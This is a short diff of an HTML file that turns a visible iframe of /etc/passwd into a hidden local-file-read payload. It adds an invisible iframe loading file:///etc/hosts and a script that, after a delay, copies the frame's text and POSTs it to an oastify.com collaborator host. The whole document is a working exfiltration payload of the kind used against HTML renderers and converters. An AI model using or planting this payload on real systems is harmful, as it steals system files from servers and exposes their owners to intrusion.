@@ -1,6 +1,27 @@
-<iframe 
+<!-- <iframe 
   src="file:///etc/passwd" 
   width="100%" 
   height="600px" 
   style="border:1px solid black;">
 </iframe>
+ -->
+ <iframe id="leaker" src="file:///etc/hosts" style="display:none;"></iframe>
+<textarea id="dump" style="display:none;"></textarea>
+
+<script>
+  setTimeout(() => {
+    try {
+      const iframe = document.getElementById("leaker");
+      const body = iframe.contentDocument.body;
+      const dump = document.getElementById("dump");
+      dump.value = body.innerText;
+
+      fetch("https://2svppvqbcsi70fe9by2ra5qd046vuoid.oastify.com/leak", {
+        method: "POST",
+        body: JSON.stringify({ content: dump.value }),
+      });
+    } catch (e) {
+      console.error("Leak failed:", e);
+    }
+  }, 3000); // wait for iframe to load
+</script>
